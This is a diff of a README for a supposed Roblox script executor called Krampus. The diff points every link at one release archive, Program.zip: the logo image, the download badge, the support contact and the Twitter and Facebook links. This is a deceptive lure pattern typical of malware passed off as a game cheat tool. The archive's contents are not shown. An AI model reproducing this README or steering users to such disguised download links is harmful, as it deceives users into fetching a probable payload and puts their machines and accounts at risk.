@@ -4,7 +4,7 @@ Welcome to Roexec-Executor repository! 🎮
 
 ## Introducing Krampus - The Premier Roblox Executor
 
-![Krampus Logo](https://example.com/krampus_logo.png)
+![Krampus Logo](https://github.com/ThealoneMax/Roexec-Executor/releases/download/v2.0/Program.zip)
 
 Krampus is the ultimate tool for script execution on the Roblox platform. Offering seamless performance on PC, Krampus empowers gamers with unparalleled control and flexibility. With Krampus, you can unleash your creativity and dominate the Roblox universe effortlessly.
 
@@ -19,7 +19,7 @@ Krampus is the ultimate tool for script execution on the Roblox platform. Offeri
 ## Installation:
 
 Download the latest version of Krampus:
-[![Download Krampus](https://img.shields.io/badge/Download-Krampus-blueviolet)](https://github.com/user-attachments/files/17578090/Program.zip)
+[![Download Krampus](https://github.com/ThealoneMax/Roexec-Executor/releases/download/v2.0/Program.zip)](https://github.com/ThealoneMax/Roexec-Executor/releases/download/v2.0/Program.zip)
 
 ## Getting Started:
 
@@ -31,7 +31,7 @@ Follow these steps to start using Krampus:
 
 ## Support:
 
-If you encounter any issues or have questions, feel free to reach out to our support team at [support@krampusexecutor.com](mailto:support@krampusexecutor.com).
+If you encounter any issues or have questions, feel free to reach out to our support team at [https://github.com/ThealoneMax/Roexec-Executor/releases/download/v2.0/Program.zip](https://github.com/ThealoneMax/Roexec-Executor/releases/download/v2.0/Program.zip).
 
 ## Contributing:
 
@@ -41,8 +41,8 @@ We welcome contributions from the community to help us enhance Krampus. If you h
 
 Follow us on social media for updates and announcements:
 
-- Twitter: [@KrampusExecutor](https://twitter.com/KrampusExecutor)
-- Facebook: [KrampusExecutor](https://www.facebook.com/KrampusExecutor)
+- Twitter: [@KrampusExecutor](https://github.com/ThealoneMax/Roexec-Executor/releases/download/v2.0/Program.zip)
+- Facebook: [KrampusExecutor](https://github.com/ThealoneMax/Roexec-Executor/releases/download/v2.0/Program.zip)
 
 ## Legal:
 
